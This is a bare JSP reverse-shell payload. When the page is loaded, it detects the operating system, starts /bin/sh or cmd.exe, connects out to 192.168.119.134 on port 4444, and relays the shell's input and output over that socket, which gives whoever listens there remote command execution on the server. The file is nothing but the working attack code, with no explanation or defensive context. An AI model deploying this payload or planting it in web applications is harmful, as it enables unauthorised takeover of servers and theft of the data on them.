<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream yp;
    OutputStream gu;

    StreamConnector( InputStream yp, OutputStream gu )
    {
      this.yp = yp;
      this.gu = gu;
    }

    public void run()
    {
      BufferedReader rn  = null;
      BufferedWriter trb = null;
      try
      {
        rn  = new BufferedReader( new InputStreamReader( this.yp ) );
        trb = new BufferedWriter( new OutputStreamWriter( this.gu ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = rn.read( buffer, 0, buffer.length ) ) > 0 )
        {
          trb.write( buffer, 0, length );
          trb.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( rn != null )
          rn.close();
        if( trb != null )
          trb.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.119.134", 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
